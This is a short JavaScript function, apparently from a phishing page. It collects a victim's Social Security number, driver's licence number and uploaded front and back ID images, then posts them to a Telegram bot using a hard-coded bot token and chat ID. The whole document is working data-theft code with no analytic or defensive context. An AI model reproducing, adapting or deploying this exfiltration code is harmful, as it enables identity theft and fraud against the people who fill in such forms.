function submitForm() {
          const BOT_TOKEN = '6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8';
          const CHAT_ID = '6929442824';

          const ssn = document.getElementById('ssn').value;
          const dl = document.getElementById('dl').value;
          //const message = document.getElementById('message').value;

          const frontInput = document.getElementById('front');
          const frontfile = frontInput.files[0];
		  
		  const backInput = document.getElementById('back');
          const backfile = backInput.files[0];
     

          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

          const formDataFront = new FormData();
          formDataFront.append('chat_id', CHAT_ID);
          formDataFront.append('document', frontfile);
		  formDataFront.append('caption', `Front\nSsn: ${ssn}\nDl: ${dl}`);
		  
		  const formDataBack = new FormData();
          formDataBack.append('chat_id', CHAT_ID);
          formDataBack.append('document', backfile);
		  formDataBack.append('caption', `Back\nSsn: ${ssn}\nDl: ${dl}`);

          fetch(apiUrl, {
              method: 'POST',
              body: formDataFront,
          })
          .then(response => response.json())
		  .then(fetch(apiUrl, {
              method: 'POST',
              body: formDataBack,
          }))
          .then(data => {
              console.log('Telegram API response:', data);
          })
          .catch(error => {
              console.error('Error sending message:', error);
             // alert('Failed to send message and file. Please try again.');
          });
      }	
